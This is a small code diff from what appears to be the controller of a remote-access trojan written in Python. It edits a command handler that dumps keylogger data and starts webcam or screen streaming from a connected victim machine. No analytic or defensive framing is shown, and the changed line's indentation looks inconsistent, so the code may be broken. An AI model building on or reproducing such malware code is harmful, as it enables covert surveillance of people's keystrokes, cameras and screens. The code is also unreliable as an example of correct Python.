@@ -152,7 +152,7 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + dump_keylogger_data())
             continue
 
-      if command.startswith("webcam_stream") or command.startswith("screenshare"):
+       elif command.startswith("webcam_stream") or command.startswith("screenshare"):
             mode = command.split('_')[0]
             start_streaming(client_socket, mode)
             continue
